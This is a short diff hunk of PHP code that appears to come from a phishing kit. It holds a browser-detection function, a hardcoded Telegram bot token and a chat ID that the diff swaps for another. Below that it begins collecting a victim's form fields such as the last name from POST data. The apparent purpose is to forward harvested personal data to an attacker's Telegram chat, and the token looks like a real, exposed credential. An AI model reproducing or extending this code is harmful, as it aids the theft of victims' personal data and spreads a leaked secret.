@@ -70,7 +70,7 @@ function getBrowser($USER_AGENT){
 }
 // Infos Telegram
 $botToken = "8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ";
-$chatId = "-4639401211";
+$chatId = "-1002514605037";
 
 // Récupération des données
 $lastname = htmlspecialchars($_POST['lastname']);
